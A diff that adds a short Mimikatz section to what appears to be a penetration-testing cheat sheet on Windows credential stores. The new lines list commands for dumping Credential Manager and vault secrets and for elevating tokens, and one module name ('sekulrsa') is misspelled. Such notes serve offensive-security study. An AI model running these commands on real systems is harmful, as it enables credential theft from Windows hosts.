@@ -86,6 +86,30 @@ UserName  Resource             Password     Properties
 ...
 ```
 
+### (3) Mimikatz
+
+1. `sekulrsa::credman`&#x20;
+
+```powershell
+mimikatz # privilege::debug
+mimikatz # sekulrsa::credman 
+```
+
+2. `vault::list`, `vault::cred`&#x20;
+
+```powershell
+mimikatz # privilege::debug
+
+mimikatz # vault::list 
+mimikatz # vault::cred 
+```
+
+If error is encountered:
+
+```powershell
+mimikatz # token::elevate
+```
+
 ### Overview of differences between `vaultcmd` and `cmdkey`
 
 1. `vaultcmd /list`&#x20;
